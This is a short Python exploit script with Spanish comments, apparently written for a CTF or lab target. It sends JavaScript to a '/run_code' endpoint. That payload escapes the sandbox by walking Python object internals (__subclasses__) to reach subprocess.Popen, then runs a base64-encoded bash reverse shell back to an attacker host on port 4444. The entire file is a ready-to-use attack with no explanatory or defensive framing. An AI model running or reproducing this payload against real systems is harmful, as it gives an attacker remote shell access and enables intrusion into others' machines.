#!/usr/bin/env python3
import base64
import json
import requests

TARGET = "http://{IP_OBJETIVO}:8000/run_code"
LHOST  = "{TU_IP}"
LPORT  = 4444

# Reverse shell (base64 para evitar problemas de comillas)
rev = f"bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'"
b64 = base64.b64encode(rev.encode()).decode()

# Payload JS: encuentra subprocess.Popen v√≠a __subclasses__ y ejecuta comando
js = f"""
var a = Object.getOwnPropertyNames({{}}).__class__.__base__.__getattribute__;
var obj = a(a(a, "__class__"), "__base__");

function findPopen(o) {{
  var subs = o.__subclasses__();
  for (var i in subs) {{
    try {{
      var item = subs[i];
      if (item.__module__ == "subprocess" && item.__name__ == "Popen") {{
        return item;
      }}
    }} catch (e) {{}}
  }}
  return null;
}}

var Popen = findPopen(obj);
if (Popen === null) {{
  "Popen_not_found";
}} else {{
  var cmd = "bash -c \\"$(echo {b64} | base64 -d)\\"";
  // args, bufsize, executable, stdin, stdout, stderr, preexec_fn, close_fds, shell
  Popen(cmd, -1, null, -1, -1, -1, null, null, true).communicate();
  "sent";
}}
"""

r = requests.post(TARGET, json={"code": js}, timeout=10)
print("HTTP", r.status_code)
print(r.text)
